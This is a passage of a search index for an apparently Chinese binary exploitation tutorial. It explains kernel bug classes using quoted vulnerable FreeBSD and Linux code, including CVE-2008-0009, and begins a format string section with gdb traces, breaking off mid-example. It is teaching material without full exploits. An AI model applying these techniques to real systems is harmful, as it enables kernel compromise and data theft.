\u8fd9\u5c06\u5bfc\u81f4\u673a\u5668\u9677\u5165\u4e0d\u4e00\u81f4\u7684\u72b6\u6001\uff0c\u901a\u5e38\u4f1a\u5bfc\u81f4\u6b7b\u673a\u6216\u91cd\u542f \u5f71\u54cd\u76ee\u6807\u7a0b\u5e8f \u653b\u51fb\u8005\u5bf9\u88ab\u653b\u51fb\u7a0b\u5e8f\uff08\u7279\u522b\u662f\u672c\u5730\u653b\u51fb\uff09\u62e5\u6709\u66f4\u591a\u7684\u63a7\u5236\uff08\u4f8b\u5982\u653b\u51fb\u8005\u53ef\u4ee5\u8bbe\u7f6e\u88ab\u653b\u51fb\u7a0b\u5e8f\u7684\u8fd0\u884c\u73af\u5883\uff09\u3002\u88ab\u653b\u51fb\u7a0b\u5e8f\u662f\u5b83\u7684\u5e93\u5b50\u7cfb\u7edf\u7684\u552f\u4e00\u4f7f\u7528\u8005\uff08\u4f8b\u5982\u5185\u5b58\u5206\u914d\u8868\uff09 \u653b\u51fb\u8005\u9700\u8981\u548c\u5176\u4ed6\u6240\u6709\u6b32\u201c\u5f71\u54cd\u201d\u5185\u6838\u7684\u5e94\u7528\u7a0b\u5e8f\u7ade\u4e89\u3002\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u90fd\u662f\u5185\u6838\u5b50\u7cfb\u7edf\u7684\u4f7f\u7528\u8005 \u6267\u884c shellcode shellcode \u53ef\u4ee5\u5229\u7528\u5df2\u7ecf\u901a\u8fc7\u5b89\u5168\u548c\u6b63\u786e\u6027\u4fdd\u8bc1\u7684\u7528\u6237\u6001\u95e8\u6765\u8fdb\u884c\u5185\u6838\u7cfb\u7edf\u8c03\u7528 shellcode \u5728\u66f4\u9ad8\u7684\u6743\u9650\u7ea7\u522b\u4e0a\u6267\u884c\uff0c\u5e76\u4e14\u5fc5\u987b\u5728\u4e0d\u60ca\u52a8\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b\u6b63\u786e\u5730\u8fd4\u56de\u5230\u5e94\u7528\u7a0b\u5e8f \u7ed5\u8fc7\u53cd\u6f0f\u6d1e\u5229\u7528\u4fdd\u62a4\u63aa\u65bd \u8fd9\u8981\u6c42\u8d8a\u6765\u8d8a\u590d\u6742\u7684\u65b9\u6cd5 \u5927\u90e8\u5206\u4fdd\u62a4\u63aa\u65bd\u5728\u5185\u6838\u6001\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fdd\u62a4\u5185\u6838\u672c\u8eab\u3002\u653b\u51fb\u8005\u751a\u81f3\u80fd\u7981\u7528\u5927\u90e8\u5206\u4fdd\u62a4\u63aa\u65bd \u5185\u6838\u6f0f\u6d1e\u5206\u7c7b \u672a\u521d\u59cb\u5316\u7684\u3001\u672a\u9a8c\u8bc1\u7684\u3001\u5df2\u635f\u574f\u7684\u6307\u9488\u89e3\u5f15\u7528 \u8fd9\u7c7b\u6f0f\u6d1e\u6db5\u76d6\u4e86\u6240\u6709\u4f7f\u7528\u6307\u9488\u7684\u60c5\u51b5\uff0c\u6240\u6307\u5185\u5bb9\u906d\u5230\u7834\u574f\u3001\u6ca1\u6709\u88ab\u6b63\u786e\u8bbe\u7f6e\u3001\u6216\u8005\u662f\u6ca1\u6709\u505a\u8db3\u591f\u7684\u9a8c\u8bc1\u3002 \u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u9759\u6001\u58f0\u660e\u7684\u6307\u9488\u88ab\u521d\u59cb\u5316\u4e3a NULL\uff0c\u4f46\u5176\u4ed6\u60c5\u51b5\u4e0b\u8fd9\u4e9b\u6307\u9488\u88ab\u660e\u786e\u5730\u8d4b\u503c\u4e4b\u524d\uff0c\u90fd\u662f\u672a\u521d\u59cb\u5316\u7684\uff0c\u5b83\u7684\u503c\u662f\u5b58\u653e\u6307\u9488\u5904\u7684\u5185\u5b58\u91cc\u7684\u4efb\u610f\u5185\u5bb9\u3002\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff0c\u6307\u9488\u88ab\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u800c\u5b83\u7684\u5185\u5bb9\u662f\u4e4b\u524d\u51fd\u6570\u7559\u5728\u6808\u4e0a\u7684 \"A\" \u5b57\u7b26\u4e32\uff1a #include <stdio.h> #include <string.h> void big_stack_usage() { char big[0x100]; memset(big, 'A', 0x100); printf(\"Big stack: %p ~ %p\\n\", big, big+0x100); } void ptr_un_initialized() { char *p; printf(\"Pointer value: %p => %p\\n\", &p, p); } int main() { big_stack_usage(); ptr_un_initialized(); } $ gcc -fno-stack-protector pointer.c $ ./a.out Big stack: 0x7fffd6b0e400 ~ 0x7fffd6b0e500 Pointer value: 0x7fffd6b0e4f8 => 0x4141414141414141 \u4e0b\u9762\u770b\u4e00\u4e2a\u771f\u5b9e\u7684\u4f8b\u5b50\uff0c\u6765\u81ea FreeBSD8.0\uff1a struct ucred ucred, *ucp; // [1] [...] refcount_init(&ucred.cr_ref, 1); ucred.cr_uid = ip->i_uid; ucred.cr_ngroups = 1; ucred.cr_groups[0] = dp->i_gid; // [2] ucp = &ucred; [1] \u5904\u7684 ucred \u5728\u6808\u4e0a\u8fdb\u884c\u4e86\u58f0\u660e\uff0c\u7136\u540e cr_groups[0] \u88ab\u8d4b\u503c\u4e3a dp->i_gid \u3002\u9057\u61be\u7684\u662f\uff0c struct ucred \u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u662f\u8fd9\u6837\u7684\uff1a struct ucred { u_int cr_ref; /* reference count */ [...] gid_t *cr_groups; /* groups */ int cr_agroups; /* Available groups */ }; \u6211\u4eec\u770b\u5230 cr_groups \u662f\u4e00\u4e2a\u6307\u9488\uff0c\u800c\u4e14\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\uff0c dp->i_gid \u7684\u503c\u5728 ucred \u88ab\u5206\u914d\u65f6\u88ab\u5199\u5165\u5230\u6808\u4e0a\u7684\u4efb\u610f\u5730\u5740\u3002 \u7ee7\u7eed\u770b\u672a\u7ecf\u9a8c\u8bc1\u7684\u6307\u9488\uff0c\u8fd9\u5f80\u5f80\u53d1\u751f\u5728\u591a\u7528\u6237\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u3002\u6211\u4eec\u77e5\u9053\u5185\u6838\u7a7a\u95f4\u4f4d\u4e8e\u7528\u6237\u7a7a\u95f4\u7684\u4e0a\u9762\uff0c\u5b83\u7684\u9875\u8868\u5728\u6240\u6709\u8fdb\u7a0b\u7684\u9875\u8868\u4e2d\u90fd\u6709\u5907\u4efd\u3002\u6709\u4e9b\u865a\u62df\u5730\u5740\u88ab\u9009\u505a\u9650\u5236\u5730\u5740\uff0c\u9650\u5b9a\u5730\u5740\u4ee5\u4e0a\u6216\u4ee5\u4e0b\u7684\u865a\u62df\u5730\u5740\u5f52\u5185\u6838\u4f7f\u7528\uff0c\u800c\u5176\u4ed6\u7684\u5f52\u7528\u6237\u7a7a\u95f4\u4f7f\u7528\u3002\u5185\u6838\u51fd\u6570\u4e5f\u5c31\u662f\u4f7f\u7528\u8fd9\u4e2a\u9650\u5b9a\u5730\u5740\u6765\u5224\u65ad\u4e00\u4e2a\u6307\u9488\u6307\u5411\u7684\u662f\u5185\u6838\u8fd8\u662f\u7528\u6237\u7a7a\u95f4\u3002\u5982\u679c\u662f\u524d\u8005\uff0c\u5219\u53ef\u80fd\u53ea\u9700\u505a\u5c11\u91cf\u7684\u9a8c\u8bc1\uff0c\u4f46\u5982\u679c\u662f\u540e\u8005\uff0c\u5219\u8981\u683c\u5916\u5c0f\u5fc3\uff0c\u5426\u5219\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684\u5730\u5740\u53ef\u80fd\u5728\u4e0d\u53d7\u63a7\u5236\u7684\u60c5\u51b5\u4e0b\u88ab\u89e3\u5f15\u7528\u3002 \u770b\u4e00\u4e2a Linux \u7684\u4f8b\u5b50\uff0cCVE-2008-0009\uff1a error = get_user(base, &iov->iov_base); // [1] [...] if (unlikely(!base)) { error = -EFAULT; break; } [...] sd.u.userptr = base; // [2] [...] size = __splice_from_pipe(pipe, &sd, pipe_to_user); [...] static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf, struct splice_desc *sd) { if (!fault_in_pages_writeable(sd->u.userptr, sd->len)) { src = buf->ops->map(pipe, buf, 1); ret = __copy_to_user_inatomic(sd->u.userptr, src + buf->offset, sd->len); // [3] buf->ops->unmap(pipe, buf, src); [...] } \u4ee3\u7801\u7684\u7b2c\u4e00\u90e8\u5206\u6765\u81ea\u51fd\u6570 vmsplice_to_user() \uff0c\u5728 [1] \u5904\u4f7f\u7528\u4e86 get_user() \u83b7\u5f97\u4e86\u76ee\u7684\u6307\u9488\u3002\u8be5\u76ee\u7684\u6307\u9488\u672a\u7ecf\u68c0\u67e5\u5c31\u9ed8\u8ba4\u5b83\u662f\u4e00\u4e2a\u7528\u6237\u5730\u5740\u6307\u9488\uff0c\u7136\u540e\u901a\u8fc7 [2] \u4f20\u9012\u7ed9\u4e86 __splice_from_pipe() \uff0c\u540c\u65f6\u4f20\u9012\u51fd\u6570 pipe_to_user \u4f5c\u4e3a helper function\u3002\u8fd9\u4e2a\u51fd\u6570\u4f9d\u7136\u662f\u672a\u7ecf\u68c0\u67e5\u5c31\u8c03\u7528\u4e86 __copy_to_user_inatomic() [3]\uff0c\u5bf9\u8be5\u6307\u9488\u505a\u89e3\u5f15\u7528\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u653b\u51fb\u8005\u4f20\u9012\u7684\u662f\u4e00\u4e2a\u5185\u6838\u5730\u5740\uff0c\u5219\u5229\u7528\u8be5\u6f0f\u6d1e\u80fd\u591f\u5199\u5165\u4efb\u610f\u6570\u636e\u5230\u4efb\u610f\u7684\u5185\u6838\u5185\u5b58\u4e2d\u3002\u8fd9\u91cc\u8981\u77e5\u9053\u7684\u8fd8\u6709 Linux \u4e2d\u4ee5\u4e24\u4e2a\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u51fd\u6570\uff08\u4f8b\u5982 __copy_to_user_inatomic() \uff09\u662f\u4e0d\u4f1a\u5bf9\u6240\u63d0\u4f9b\u7684\u76ee\u7684\uff08\u6216\u6e90\uff09\u7528\u6237\u6307\u9488\u505a\u4efb\u4f55\u68c0\u67e5\u7684\u3002 \u6700\u540e\uff0c\u4e00\u4e2a\u88ab\u635f\u574f\u7684\u6307\u9488\u5f80\u5f80\u662f\u5176\u4ed6\u6f0f\u6d1e\u7684\u7ed3\u679c\uff08\u4f8b\u5982\u7f13\u51b2\u533a\u6ea2\u51fa\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u6307\u9488\u7684\u5185\u5bb9\uff0c\u83b7\u5f97\u66f4\u591a\u7684\u63a7\u5236\u6743\u3002 \u5185\u5b58\u7834\u574f\u6f0f\u6d1e \u8fd9\u7c7b\u6f0f\u6d1e\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u9519\u8bef\u64cd\u4f5c\u91cd\u5199\u4e86\u5185\u6838\u7a7a\u95f4\u7684\u5185\u5b58\uff08\u5305\u62ec\u5185\u6838\u6808\u548c\u5185\u6838\u5806\uff09\u5bfc\u81f4\u7684\u3002 \u5185\u6838\u6808\u5728\u6bcf\u6b21\u8fdb\u7a0b\u8fdb\u5165\u5230\u5185\u6838\u6001\u65f6\u53d1\u6325\u4f5c\u7528\u3002\u5185\u6838\u6808\u4e0e\u7528\u6237\u6808\u57fa\u672c\u76f8\u540c\uff0c\u4f46\u4e5f\u6709\u4e00\u4e9b\u7ec6\u5c0f\u7684\u5dee\u522b\uff0c\u4f8b\u5982\u5b83\u7684\u5927\u5c0f\u901a\u5e38\u662f\u53d7\u9650\u5236\u7684\u3002\u53e6\u5916\uff0c\u6240\u6709\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u90fd\u662f\u4e00\u5757\u76f8\u540c\u7684\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u4ed6\u4eec\u5f00\u59cb\u4e8e\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\u5e76\u4e14\u5360\u636e\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 \u7531\u4e8e\u5185\u6838\u6808\u4e0e\u7528\u6237\u6808\u7684\u76f8\u4f3c\u6027\uff0c\u5176\u53d1\u751f\u6f0f\u6d1e\u7684\u5730\u65b9\u4e5f\u5927\u4f53\u76f8\u540c\uff0c\u4f8b\u5982\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u51fd\u6570\uff08 strcpy() , sprintf() \u7b49\uff09\uff0c\u6570\u7ec4\u8d8a\u754c\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u7b49\u3002 \u9488\u5bf9\u5185\u6838\u5806\u7684\u6f0f\u6d1e\u5f80\u5f80\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u9020\u6210\u7684\u3002\u901a\u8fc7\u6ea2\u51fa\uff0c\u91cd\u5199\u4e86\u6ea2\u51fa\u5757\u540e\u9762\u7684\u5757\uff0c\u6216\u8005\u91cd\u5199\u4e86\u7f13\u5b58\u76f8\u5173\u7684\u5143\u6570\u636e\uff0c\u90fd\u53ef\u80fd\u9020\u6210\u6f0f\u6d1e\u5229\u7528\u3002 \u6574\u6570\u8bef\u7528 \u6574\u6570\u6ea2\u51fa\u548c\u7b26\u53f7\u8f6c\u6362\u9519\u8bef\u662f\u6700\u5e38\u89c1\u7684\u4e24\u79cd\u6574\u6570\u8bef\u7528\u6f0f\u6d1e\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u5f80\u5f80\u4e0d\u5bb9\u6613\u5355\u72ec\u5229\u7528\uff0c\u4f46\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53e6\u5916\u7684\u4e00\u4e9b\u6f0f\u6d1e\uff08\u4f8b\u5982\u5185\u5b58\u6ea2\u51fa\uff09\u7684\u53d1\u751f\u3002 \u6574\u6570\u6ea2\u51fa\u53d1\u751f\u5728\u5c06\u4e00\u4e2a\u8d85\u51fa\u6574\u6570\u6570\u636e\u5b58\u50a8\u8303\u56f4\u7684\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u6574\u6570\u53d8\u91cf\u3002\u5728\u4e0d\u52a0\u63a7\u5236\u7684\u52a0\u6cd5\u548c\u4e58\u6cd5\u8fd0\u7b97\u4e2d\u5982\u679c\u5806\u53c2\u89c1\u8fd0\u7b97\u7684\u53c2\u6570\u4e0d\u52a0\u9a8c\u8bc1\uff0c\u4e5f\u6709\u53ef\u80fd\u53d1\u751f\u6574\u6570\u6ea2\u51fa\u3002 \u7b26\u53f7\u8f6c\u6362\u9519\u8bef\u53d1\u751f\u5728\u5c06\u4e00\u4e2a\u65e0\u7b26\u53f7\u6570\u5f53\u505a\u6709\u7b26\u53f7\u6570\u5904\u7406\u7684\u65f6\u5019\u3002\u4e00\u4e2a\u7ecf\u5178\u7684\u573a\u666f\u662f\uff0c\u4e00\u4e2a\u6709\u7b26\u53f7\u6570\u7ecf\u8fc7\u67d0\u4e2a\u6700\u5927\u503c\u68c0\u6d4b\u540e\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\uff0c\u800c\u8fd9\u4e2a\u51fd\u6570\u53ea\u63a5\u6536\u65e0\u7b26\u53f7\u6570\u3002 \u770b\u4e00\u4e2a FreeBSD V6.0 \u7684\u4f8b\u5b50\uff1a int fw_ioctl (struct cdev *dev, u_long cmd, caddr_t data, int flag, fw_proc *td) { [...] int s, i, len, err = 0; [1] [...] struct fw_crom_buf *crom_buf = (struct fw_crom_buf *)data; [2] [...] if (fwdev == NULL) { [...] len = CROMSIZE; [...] } else { [...] if (fwdev->rommax < CSRROMOFF) len = 0; else len = fwdev->rommax - CSRROMOFF + 4; } if (crom_buf->len < len) [3] len = crom_buf->len; else crom_buf->len = len; err = copyout(ptr, crom_buf->ptr, len); [4] } [1] \u5904\u7684 len \u662f\u6709\u7b26\u53f7\u6574\u6570\uff0c crom_buf->len \u4e5f\u662f\u6709\u7b26\u53f7\u6570\u5e76\u4e14\u8be5\u503c\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\uff0c\u5982\u679c\u5b83\u88ab\u8bbe\u4e3a\u4e00\u4e2a\u8d1f\u6570\uff0c\u90a3\u4e48\u65e0\u8bba len \u7684\u503c\u662f\u4ec0\u4e48\uff0c[3] \u5904\u7684\u6761\u4ef6\u90fd\u4f1a\u6ee1\u8db3\u3002\u7136\u540e\u5728 [4] \u5904\uff0c copyout() \u88ab\u8c03\u7528\uff0c\u8be5\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a int copyout(const void *__restrict kaddr, void *__restrict udaddr, size_t len) __nonnull(1) __nonnull(2); \u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u7c7b\u578b size_t \u662f\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u6240\u4ee5\u5f53 len \u662f\u4e00\u4e2a\u8d1f\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6b63\u6574\u6570\uff0c\u9020\u6210\u4efb\u610f\u5185\u6838\u5185\u5b58\u8bfb\u53d6\u3002 \u66f4\u591a\u5185\u5b58\u53ef\u4ee5\u53c2\u89c1\u7ae0\u8282 3.1.2\u3002 \u7ade\u6001\u6761\u4ef6 \u5982\u679c\u6709\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u6267\u884c\u8005\u5c06\u8981\u6267\u884c\u67d0\u4e00\u52a8\u4f5c\u5e76\u4e14\u6267\u884c\u7ed3\u679c\u4f1a\u7531\u4e8e\u5b83\u4eec\u6267\u884c\u987a\u5e8f\u7684\u4e0d\u540c\u800c\u5b8c\u5168\u4e0d\u540c\u65f6\uff0c\u4e5f\u5c31\u662f\u53d1\u751f\u4e86\u7ade\u4e89\u6761\u4ef6\u3002\u907f\u514d\u7ade\u4e89\u6761\u4ef6\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f8b\u5982\u901a\u8fc7\u9501\u3001\u4fe1\u53f7\u91cf\u3001\u6761\u4ef6\u53d8\u91cf\u7b49\u6765\u4fdd\u8bc1\u5404\u79cd\u884c\u52a8\u8005\u4e4b\u95f4\u7684\u540c\u6b65\u6027\u3002\u7ade\u4e89\u6761\u4ef6\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f\u53ef\u7ade\u4e89\u7a97\u53e3\u7684\u5927\u5c0f\uff0c\u5b83\u5bf9\u4e8e\u89e6\u53d1\u7ade\u6001\u6761\u4ef6\u7684\u96be\u6613\u81f3\u5173\u91cd\u8981\uff0c\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4e00\u4e9b\u7ade\u6001\u6761\u4ef6\u7684\u60c5\u51b5\u53ea\u80fd\u5728\u5bf9\u79f0\u591a\u5904\u7406\u5668\uff08SMP\uff09\u4e2d\u88ab\u5229\u7528\u3002 \u903b\u8f91 bug \u903b\u8f91 bug \u6709\u5f88\u591a\u79cd\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\u5668\u6ea2\u51fa\u3002\u6211\u4eec\u77e5\u9053\u5171\u4eab\u8d44\u6e90\u90fd\u6709\u4e00\u4e2a\u5f15\u7528\u8ba1\u6570\uff0c\u5e76\u5728\u8ba1\u6570\u4e3a\u96f6\u65f6\u91ca\u653e\u6389\u8d44\u6e90\uff0c\u4fdd\u6301\u8db3\u591f\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u64cd\u4f5c\u7cfb\u7edf\u5f80\u5f80\u63d0\u4f9b get \u548c put/drop \u8fd9\u6837\u7684\u51fd\u6570\u6765\u663e\u5f0f\u5730\u589e\u52a0\u548c\u51cf\u5c11\u5f15\u7528\u8ba1\u6570\u3002 \u770b\u4e00\u4e2a FreeBSD V5.0 \u7684\u4f8b\u5b50\uff1a int fpathconf(td, uap) struct thread *td; register struct fpathconf_args *uap; { struct file *fp; struct vnode *vp; int error; if ((error = fget(td, uap->fd, &fp)) != 0) [1] return (error); [...] switch (fp->f_type) { case DTYPE_PIPE: case DTYPE_SOCKET: if (uap->name != _PC_PIPE_BUF) return (EINVAL); [2] p->p_retval[0] = PIPE_BUF; error = 0; break; [...] out: fdrop(fp, td); [3] return (error); } fpathconf() \u7cfb\u7edf\u8c03\u7528\u7528\u4e8e\u83b7\u53d6\u4e00\u4e2a\u7279\u5b9a\u7684\u5f00\u653e\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4fe1\u606f\u3002\u6240\u4ee5\u8be5\u8c03\u7528\u5f00\u5934 [1] \u5904\u901a\u8fc7 fget() \u83b7\u53d6\u8be5\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed3\u6784\u7684\u5f15\u7528\uff0c\u7136\u540e\u5728\u9000\u51fa\u7684\u65f6\u5019 [3] \u5904\u901a\u8fc7 fdrop() \u91ca\u653e\u8be5\u5f15\u7528\u3002\u7136\u800c\u5728 [2] \u5904\u7684\u4ee3\u7801\u6ca1\u6709\u91ca\u653e\u76f8\u5173\u7684\u5f15\u7528\u8ba1\u6570\u5c31\u76f4\u63a5\u8fd4\u56de\u4e86\u3002\u5982\u679c\u591a\u6b21\u8c03\u7528 fpathconf() \u5e76\u89e6\u53d1 [2] \u5904\u7684\u8fd4\u56de\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u5f15\u7528\u8ba1\u6570\u5668\u7684\u6ea2\u51fa\u3002","title":"Binary Exploitation"},{"location":"Tutorial/Material/Binary%20Exploitation/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"Tutorial/Material/Binary%20Exploitation/#311","text":"\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u672c\u539f\u7406 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 x86-64 \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e CTF \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u6269\u5c55\u9605\u8bfb","title":"3.1.1 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"Tutorial/Material/Binary%20Exploitation/#_1","text":"\u5728 C \u8bed\u8a00\u57fa\u7840\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u3002\u5728\u5f00\u59cb\u63a2\u7d22\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e4b\u524d\uff0c\u5f3a\u70c8\u5efa\u8bae\u56de\u987e\u8be5\u7ae0\u8282\u3002\u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u56de\u987e\u51e0\u4e2a\u5e38\u7528\u7684\u3002","title":"\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32"},{"location":"Tutorial/Material/Binary%20Exploitation/#_2","text":"#include <stdio.h> int printf(const char *format, ...); int fprintf(FILE *stream, const char *format, ...); int dprintf(int fd, const char *format, ...); int sprintf(char *str, const char *format, ...); int snprintf(char *str, size_t size, const char *format, ...);","title":"\u51fd\u6570"},{"location":"Tutorial/Material/Binary%20Exploitation/#_3","text":"\u5b57\u7b26 \u7c7b\u578b \u4f7f\u7528 d 4-byte Integer u 4-byte Unsigned Integer x 4-byte Hex s 4-byte ptr String c 1-byte Character","title":"\u8f6c\u6362\u6307\u793a\u7b26"},{"location":"Tutorial/Material/Binary%20Exploitation/#_4","text":"\u5b57\u7b26 \u7c7b\u578b \u4f7f\u7528 hh 1-byte char h 2-byte short int l 4-byte long int ll 8-byte long long int","title":"\u957f\u5ea6"},{"location":"Tutorial/Material/Binary%20Exploitation/#_5","text":"#include<stdio.h> #include<stdlib.h> void main() { char *format = \"%s\"; char *arg1 = \"Hello World!\\n\"; printf(format, arg1); } printf(\"%03d.%03d.%03d.%03d\", 127, 0, 0, 1); // \"127.000.000.001\" printf(\"%.2f\", 1.2345); // 1.23 printf(\"%#010x\", 3735928559); // 0xdeadbeef printf(\"%s%n\", \"01234\", &n); // n = 5","title":"\u793a\u4f8b"},{"location":"Tutorial/Material/Binary%20Exploitation/#_6","text":"\u5728 x86 \u7ed3\u6784\u4e0b\uff0c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u662f\u901a\u8fc7\u6808\u4f20\u9012\u7684\uff0c\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a #include<stdio.h> void main() { printf(\"%s %d %s\", \"Hello World!\", 233, \"\\n\"); } gdb-peda$ disassemble main Dump of assembler code for function main: 0x0000053d <+0>: lea ecx,[esp+0x4] 0x00000541 <+4>: and esp,0xfffffff0 0x00000544 <+7>: push DWORD PTR [ecx-0x4] 0x00000547 <+10>: push ebp 0x00000548 <+11>: mov ebp,esp 0x0000054a <+13>: push ebx 0x0000054b <+14>: push ecx 0x0000054c <+15>: call 0x585 <__x86.get_pc_thunk.ax> 0x00000551 <+20>: add eax,0x1aaf 0x00000556 <+25>: lea edx,[eax-0x19f0] 0x0000055c <+31>: push edx 0x0000055d <+32>: push 0xe9 0x00000562 <+37>: lea edx,[eax-0x19ee] 0x00000568 <+43>: push edx 0x00000569 <+44>: lea edx,[eax-0x19e1] 0x0000056f <+50>: push edx 0x00000570 <+51>: mov ebx,eax 0x00000572 <+53>: call 0x3d0 <printf@plt> 0x00000577 <+58>: add esp,0x10 0x0000057a <+61>: nop 0x0000057b <+62>: lea esp,[ebp-0x8] 0x0000057e <+65>: pop ecx 0x0000057f <+66>: pop ebx 0x00000580 <+67>: pop ebp 0x00000581 <+68>: lea esp,[ecx-0x4] 0x00000584 <+71>: ret End of assembler dump. gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x56557000 --> 0x1efc EBX: 0x56557000 --> 0x1efc ECX: 0xffffd250 --> 0x1 EDX: 0x5655561f (\"%s %d %s\") ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd238 --> 0x0 ESP: 0xffffd220 --> 0x5655561f (\"%s %d %s\") EIP: 0x56555572 (<main+53>: call 0x565553d0 <printf@plt>) EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555569 <main+44>: lea edx,[eax-0x19e1] 0x5655556f <main+50>: push edx 0x56555570 <main+51>: mov ebx,eax => 0x56555572 <main+53>: call 0x565553d0 <printf@plt> 0x56555577 <main+58>: add esp,0x10 0x5655557a <main+61>: nop 0x5655557b <main+62>: lea esp,[ebp-0x8] 0x5655557e <main+65>: pop ecx Guessed arguments: arg[0]: 0x5655561f (\"%s %d %s\") arg[1]: 0x56555612 (\"Hello World!\") arg[2]: 0xe9 arg[3]: 0x56555610 --> 0x6548000a ('\\n') [------------------------------------stack-------------------------------------] 0000| 0xffffd220 --> 0x5655561f (\"%s %d %s\") 0004| 0xffffd224 --> 0x56555612 (\"Hello World!\") 0008| 0xffffd228 --> 0xe9 0012| 0xffffd22c --> 0x56555610 --> 0x6548000a ('\\n') 0016| 0xffffd230 --> 0xffffd250 --> 0x1 0020| 0xffffd234 --> 0x0 0024| 0xffffd238 --> 0x0 0028| 0xffffd23c --> 0xf7df1253 (<__libc_start_main+243>: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555572 in main () gdb-peda$ r Continuing Hello World! 233 [Inferior 1 (process 27416) exited with code 022] \u6839\u636e cdecl \u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u5728\u8fdb\u5165 printf() \u51fd\u6570\u4e4b\u524d\uff0c\u5c06\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u4f9d\u6b21\u538b\u6808\u3002\u8fdb\u5165 printf() \u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u3002\u5982\u679c\u5b57\u7b26\u4e0d\u662f % \uff0c\u5b57\u7b26\u76f4\u63a5\u590d\u5236\u5230\u8f93\u51fa\u4e2d\u3002\u5426\u5219\uff0c\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\u5e76\u89e3\u6790\u8f93\u51fa\u3002\uff08\u6ce8\u610f\uff1a % d \u548c %d \u662f\u4e00\u6837\u7684\uff09 \u63a5\u4e0b\u6765\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u7ed9\u683c\u5f0f\u5b57\u7b26\u4e32\u52a0\u4e0a %x %x %x %3$s \uff0c\u4f7f\u5b83\u51fa\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff1a #include<stdio.h> void main() { printf(\"%s %d %s %x %x %x %3$s\", 